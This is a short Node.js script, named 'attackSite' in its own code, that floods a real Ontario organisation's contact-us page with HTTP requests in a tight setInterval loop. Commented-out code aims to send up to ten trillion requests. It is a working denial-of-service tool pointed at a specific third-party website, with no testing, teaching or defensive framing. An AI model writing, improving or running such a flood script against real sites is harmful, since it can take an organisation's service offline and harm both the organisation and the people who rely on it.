let numberofRequest=10000000000000
const fetch=require("isomorphic-fetch")
var index=0
const attackSite=async()=>{
    console.log("fetch_time: ",index++ )
    try {
       
    const response=  await fetch("https://ipobontario.ca/contact-us/") 
     const result=await response.text()
     console.log(result)
    } catch (error) {
     console.log(error.message)   
    }
}



 setInterval(async()=>{
    attackSite()
//   for(let index=0; index <numberofRequest; index++){
// attackSite()
// attackSite()
// }
},0.1)

// for(let index=0; index <numberofRequest; index++){

//  async()=>attackSite()
// }

// (async()=>{
//   attackSite()
// })()